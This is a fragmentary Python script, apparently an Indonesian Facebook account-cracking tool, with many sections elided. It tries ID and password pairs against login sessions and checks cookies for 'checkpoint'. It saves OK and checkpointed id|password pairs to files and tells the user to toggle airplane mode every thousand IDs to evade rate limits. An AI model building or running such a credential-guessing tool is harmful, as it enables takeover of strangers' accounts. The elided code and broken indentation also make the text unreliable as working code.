...
def lah():
	print(f'➤ Total ID Yang Terkumpul :{h} %s '%(len(id)))
	input(f'➤ [ {m}Klik Enter {x}] ')
	print('')
	pass
	setting()
...
def passwrd():
	...
	jalan(f'➤ Mainkan Mode Pesawat Setiap {m}1k{x} Idz\n')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\rASEP {P}{b}{loop}{P}•{u}{len(id)}{P} [OK] {P}{H}{ok}{P} [CP] {P}{k}{cp}{x} [{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
               ...
               # print(f'\r{H}Cookie   : {coki}\n')
				...
				headapp={"user-agent":"Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)AppleTV6,2/11.1AppleTV5,3/9.1.1"}
				if 'no' in taplikasi:
					ok+=1
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%sASEP %s|%s ➤ CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
	...
	for kes in akun:
		try:
			try:
				...
				time.sleep(2)
				print('\r%sASEP %s ➤ Error      %s'%(b,kes,x))
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%sASEP %s|%s ➤ CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s➤  Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
				...
				print('\r%sASEP %s|%s ➤ OK       %s'%(h,id,pw,x))
			else:
				print('\r%sASEP %s|%s ➤ SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
